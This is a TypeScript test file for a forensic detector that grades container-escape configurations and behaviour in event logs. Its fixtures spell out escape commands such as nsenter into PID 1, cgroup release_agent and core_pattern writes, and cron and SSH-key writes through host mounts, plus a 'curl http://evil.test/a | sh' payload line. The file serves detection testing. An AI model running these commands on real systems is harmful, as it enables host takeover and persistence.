import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  configRisks,
  escapeBehavior,
  markContainerEscape,
  exposedHostPaths,
} from "../../src/analysis/containerEscape.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

let seq = 0;
const ev = (over: Partial<ForensicEvent> = {}): ForensicEvent => ({
  id: `e${++seq}`,
  timestamp: "2026-01-01T10:00:00Z",
  description: "",
  severity: "Info",
  mitreTechniques: [],
  relatedFindingIds: [],
  sourceScreenshots: [],
  asset: "node-01",
  ...over,
});

const run = (cmd: string) => ev({ description: "Process created: docker", commandLine: cmd });

describe("configuration — what makes escape possible", () => {
  it("reads --privileged", () => {
    const [r] = configRisks("docker run --privileged -d alpine sleep 1");
    expect(r.primitive).toBe("privileged");
    expect(r.mitre).toContain("T1611");
  });

  it("reads a mounted docker socket in both spellings", () => {
    for (const cmd of [
      "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
      "podman run --volume /run/docker.sock:/sock alpine",
      "docker run --mount type=bind,source=/var/run/docker.sock,target=/s alpine",
    ]) {
      const risks = configRisks(cmd);
      expect(
        risks.some((r) => r.primitive.includes("docker.sock")),
        cmd,
      ).toBe(true);
    }
  });

  it("reads a host filesystem mount", () => {
    expect(configRisks("docker run -v /:/host alpine")[0].detail).toContain("entire host filesystem");
    expect(configRisks("docker run -v /etc:/hostetc alpine")[0].hostPath).toBe("/etc");
    expect(configRisks("docker run -v /root:/r alpine")[0].detail).toContain("SSH keys");
  });

  it("reads a dangerous capability", () => {
    for (const cap of ["SYS_ADMIN", "sys_ptrace", "CAP_SYS_MODULE", "DAC_READ_SEARCH", "ALL"]) {
      const risks = configRisks(`docker run --cap-add=${cap} alpine`);
      expect(risks.length, cap).toBeGreaterThan(0);
    }
  });

  it("reads a shared namespace that is an escape primitive", () => {
    expect(configRisks("docker run --pid=host alpine")[0].detail).toContain("PID namespace");
    expect(configRisks("docker run --userns=host alpine")[0].primitive).toBe("ns:user");
    expect(configRisks("docker run --ipc=host alpine")[0].primitive).toBe("ns:IPC");
  });

  // Host networking is an isolation choice, not an escape primitive. Node exporters, ingress
  // controllers, DNS and CNI plugins use it across most estates.
  it("says nothing about host networking", () => {
    expect(configRisks("docker run -d --network host --name node-exporter prom/node-exporter")).toEqual([]);
    expect(configRisks("docker run --net=host --uts=host alpine")).toEqual([]);
  });

  it("reads an unconfined security profile and a raw device", () => {
    expect(configRisks("docker run --security-opt seccomp=unconfined alpine")[0].detail).toContain(
      "syscall filtering",
    );
    expect(configRisks("docker run --device=/dev/sda alpine")[0].detail).toContain("raw device");
  });

  it("lists every primitive a command combines", () => {
    const risks = configRisks("docker run --privileged --pid=host -v /:/host --cap-add=SYS_MODULE alpine");
    expect(risks.length).toBeGreaterThanOrEqual(4);
  });

  it("says nothing about an ordinary container", () => {
    for (const cmd of [
      "docker run -d --name web -p 8080:80 -v /srv/app:/app nginx",
      "docker run --rm -v /var/lib/myapp:/data postgres:16",
      "docker compose up -d",
      "docker ps -a",
      "docker run --cap-drop=ALL --security-opt no-new-privileges alpine",
    ]) {
      expect(configRisks(cmd), cmd).toEqual([]);
    }
  });

  it("says nothing about a command that is not a container command", () => {
    expect(configRisks("rsync -av --privileged /a /b")).toEqual([]);
  });

  it("does not read a disabled flag as enabled", () => {
    expect(configRisks("docker run --privileged=false alpine")).toEqual([]);
  });

  it("reports the host paths this case's containers expose", () => {
    expect(
      exposedHostPaths([run("docker run -v /etc:/e alpine"), run("docker run -v /root:/r alpine")]),
    ).toEqual(["/etc", "/root"]);
  });
});

describe("behaviour — escape attempted or achieved", () => {
  // nsenter into PID 1 needs a container in the picture: on a bare host it is ordinary
  // administration, and grading it there was a false positive.
  it("sees nsenter into PID 1 from inside a container", () => {
    expect(escapeBehavior("docker exec c1 nsenter -t 1 -m -u -i -n -p -- bash")[0].primitive).toBe(
      "nsenter-pid1",
    );
    expect(escapeBehavior("nsenter --target 1 --mount --pid -- chroot /host sh")[0].primitive).toBe(
      "nsenter-pid1",
    );
  });

  it("sees a chroot into a mounted host filesystem", () => {
    const [b] = escapeBehavior("chroot /host /bin/bash");
    expect(b.primitive).toBe("chroot-host");
    expect(b.hostPath).toBe("/host");
  });

  it("sees the cgroup release_agent escape", () => {
    const [b] = escapeBehavior("echo /cmd > /sys/fs/cgroup/rdma/release_agent");
    expect(b.detail).toContain("runs that program on the HOST");
  });

  // Same reason: a distribution configures core_pattern for its own crash handler.
  it("sees a core_pattern write from inside a container", () => {
    expect(
      escapeBehavior("docker exec c1 sh -c \"echo '|/tmp/x' > /proc/sys/kernel/core_pattern\"")[0].primitive,
    ).toBe("core-pattern");
  });

  it("sees the Docker API called over the socket", () => {
    const [b] = escapeBehavior(
      "curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create",
    );
    expect(b.mitre).toContain("T1610");
  });

  // The finding that needs both halves.
  it("sees a container-originated change to host persistence, and names the host path", () => {
    const [b] = escapeBehavior("echo '* * * * * root /tmp/x' > /host/etc/cron.d/backup");
    expect(b.primitive).toBe("host-persistence-write");
    expect(b.hostPath).toBe("/etc/cron.d/backup");
  });

  it("sees a write to root's authorized_keys through a mount", () => {
    const [b] = escapeBehavior("tee /mnt/host/root/.ssh/authorized_keys");
    expect(b.hostPath).toBe("/root/.ssh/authorized_keys");
  });

  it("says nothing about ordinary work inside a container", () => {
    for (const cmd of [
      "nsenter -t 4242 -n ip addr",
      "chroot /srv/build /usr/bin/make",
      "echo hello > /app/out.txt",
      "cat /proc/self/cgroup",
      "curl https://api.example.test/health",
    ]) {
      expect(escapeBehavior(cmd), cmd).toEqual([]);
    }
  });

  it("notes a payload carried along with an escape, but not on its own", () => {
    const withEscape = escapeBehavior(
      "docker exec c1 nsenter -t 1 -m -- sh -c 'curl -s http://evil.test/a | sh'",
    );
    expect(withEscape.some((b) => b.primitive === "escape-payload")).toBe(true);
    expect(escapeBehavior("curl -s http://evil.test/a | sh")).toEqual([]);
  });
});

describe("markContainerEscape — configuration and behaviour are different claims", () => {
  it("grades a configuration Medium and says it is not evidence of an escape", () => {
    const [out] = markContainerEscape([run("docker run --privileged -d alpine sleep 1")]);
    expect(out.severity).toBe("Medium");
    expect(out.description).toContain("CONFIGURATION, not behaviour");
    expect(out.description).toContain("does NOT show that anyone escaped");
    expect(out.description).toContain("CI runners, monitoring agents");
  });

  it("grades a behaviour High and says it is not a configuration", () => {
    const [out] = markContainerEscape([
      ev({ commandLine: "docker exec c1 nsenter -t 1 -m -u -i -n -p -- bash" }),
    ]);
    expect(out.severity).toBe("High");
    expect(out.description).toContain("BEHAVIOUR, not configuration");
    expect(out.mitreTechniques).toContain("T1611");
  });

  it("tells the analyst where to look on the host for a persistence write", () => {
    const [out] = markContainerEscape([ev({ commandLine: "echo x > /host/etc/cron.d/backup" })]);
    expect(out.description).toContain("/etc/cron.d/backup");
    expect(out.description).toContain("two halves of one event");
  });

  it("says how many primitives a configuration combines", () => {
    const [out] = markContainerEscape([run("docker run --privileged --pid=host -v /:/host alpine")]);
    expect(out.description).toContain("separate primitives are combined");
  });

  it("is idempotent", () => {
    const once = markContainerEscape([run("docker run --privileged alpine")]);
    expect(markContainerEscape(once)[0].description).toBe(once[0].description);
  });

  it("never lowers a severity the event already had", () => {
    const raised = [{ ...run("docker run --privileged alpine"), severity: "Critical" as const }];
    expect(markContainerEscape(raised)[0].severity).toBe("Critical");
  });

  it("returns the input untouched when nothing matches", () => {
    const events = [run("docker ps"), ev({ description: "Process created: notepad.exe" })];
    expect(markContainerEscape(events)).toBe(events);
  });
});

// Every one of these was a real defect found in review.
describe("regressions", () => {
  // /mnt is the most common chroot target on Linux. RHEL rescue mode is `chroot /mnt/sysimage`.
  it("does not call ordinary host administration an escape", () => {
    for (const cmd of [
      "chroot /mnt/sysimage /bin/bash",
      "chroot /mnt/gentoo /bin/bash -c 'emerge --sync'",
      "cat /proc/sys/kernel/core_pattern > /cases/HOST01/core_pattern.txt",
      "grep -r notify_on_release /sys/fs/cgroup > /cases/HOST01/cgroup.txt",
      "docker -H unix:///var/run/docker.sock ps -a",
      "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
    ]) {
      expect(escapeBehavior(cmd), cmd).toEqual([]);
    }
  });

  it("still sees a mutating call over the socket", () => {
    expect(
      escapeBehavior("curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create"),
    ).toHaveLength(1);
  });

  // cp, mv and install put the DESTINATION last — the three forms an operator is likeliest to type.
  it("reads the destination of a copy, not its source", () => {
    for (const cmd of [
      "docker exec web cp /tmp/payload /host/etc/cron.d/backup",
      "mv /tmp/payload /host/etc/cron.d/backup",
      "install -m 755 /tmp/payload /host/etc/cron.d/backup",
    ]) {
      const [b] = escapeBehavior(cmd);
      expect(b?.primitive, cmd).toBe("host-persistence-write");
      expect(b?.hostPath, cmd).toBe("/etc/cron.d/backup");
    }
  });

  // A hardening audit and a label are not configurations.
  it("does not read a --privileged token that is not a run flag", () => {
    expect(configRisks("docker inspect app | grep -- --privileged")).toEqual([]);
    expect(configRisks('docker run --label "--privileged" nginx')).toEqual([]);
    expect(configRisks("docker ps --filter label=--privileged")).toEqual([]);
  });

  // Anchoring at the end made a mount of the sensitive file itself invisible.
  it("reads a mount of a sensitive sub-path", () => {
    for (const cmd of [
      "docker run -d -v /root/.ssh:/keys alpine",
      "docker run -d -v /etc/shadow:/tmp/shadow alpine",
      "docker run -d -v /home/alice/.ssh:/keys alpine",
    ]) {
      expect(configRisks(cmd).length, cmd).toBeGreaterThan(0);
    }
  });

  it("does not read a lookalike directory as the runtime's own state", () => {
    expect(configRisks("docker run -d -v /var/lib/dockerhub-cache:/cache registry:2")).toEqual([]);
    expect(configRisks("docker run -d -v /var/lib/containerd-shim-logs:/l alpine")).toEqual([]);
  });

  it("reads a comma-separated capability list", () => {
    const risks = configRisks("podman run --cap-add=CAP_SYS_ADMIN,CAP_NET_ADMIN alpine");
    expect(risks.map((r) => r.primitive)).toContain("cap:sys_admin");
  });
});

describe("reachability", () => {
  it("runs from the merge", () => {
    const merge = readFileSync(join(process.cwd(), "src/analysis/stateMerge.ts"), "utf8");
    expect(merge).toContain("markContainerEscape");
  });

  it("has its marker stripped before correlation keys a duplicate", () => {
    const corr = readFileSync(join(process.cwd(), "src/analysis/correlate.ts"), "utf8");
    expect(corr).toContain("container escape");
  });
});

// Found by the codex review of this item.
describe("codex review regressions", () => {
  // The behaviour rules assumed a container context that was never established, so they ran on
  // every event — and several describe things a host administrator does routinely.
  it("does not grade ordinary host administration as an escape", () => {
    for (const cmd of [
      "nsenter -t 1 -m -u -i -n -p -- bash",
      "echo '|/usr/lib/systemd/systemd-coredump' > /proc/sys/kernel/core_pattern",
    ]) {
      expect(escapeBehavior(cmd), cmd).toEqual([]);
    }
  });

  it("grades the same commands as an escape once a container is in the picture", () => {
    expect(escapeBehavior("docker exec web nsenter -t 1 -m -u -i -n -p -- bash")).not.toEqual([]);
    expect(
      escapeBehavior(`podman exec c1 sh -c "echo '|/tmp/x' > /proc/sys/kernel/core_pattern"`),
    ).not.toEqual([]);
  });

  // A conventional host-mount path IS the container context — nothing else creates /host.
  it("treats a mounted-host path as the context itself", () => {
    expect(escapeBehavior("chroot /host /bin/bash")).not.toEqual([]);
    expect(escapeBehavior("cp /tmp/payload /host/etc/cron.d/backup")).not.toEqual([]);
  });

  // A redirect inside quotes is text; the body of `sh -c` is a command.
  it("does not read a quoted mention as a write", () => {
    expect(escapeBehavior(`echo "audit text > /proc/sys/kernel/core_pattern"`)).toEqual([]);
  });

  // The destination capture ran past a shell separator and named the path that was READ.
  it("stops the destination capture at a shell separator", () => {
    for (const cmd of [
      "cp /tmp/a /backup/a; cat /host/etc/cron.d/x",
      "cp /tmp/a /backup/a && ls /host/etc/cron.d/x",
    ]) {
      expect(escapeBehavior(cmd), cmd).toEqual([]);
    }
  });

  // The guard trusted adversary-controlled description text.
  it("cannot be silenced by a marker in the imported description", () => {
    const [out] = markContainerEscape([
      ev({
        description: "Imported text [container escape: attacker supplied]",
        commandLine: "docker run --privileged alpine",
      }),
    ]);
    expect(out.severity).toBe("Medium");
  });
});
